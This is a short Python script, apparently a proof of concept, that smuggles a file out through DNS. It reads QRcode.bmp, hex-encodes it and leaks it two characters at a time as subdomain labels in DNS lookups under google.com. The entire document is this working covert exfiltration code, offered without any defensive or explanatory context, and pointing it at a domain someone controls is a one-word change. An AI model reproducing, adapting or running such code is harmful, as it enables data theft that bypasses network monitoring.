import socket

f = open('QRcode.bmp', 'rb')
payload = f.read();
f.close();

message = '\S' + payload + '\E'
message = message.encode('hex')
print(message)

for b in range(0, len(message), 2):
	send = 'a' + 'EF' + message[b] + message[b+1] + '.google.com'
	print(send)
	addr = socket.gethostbyname(send)
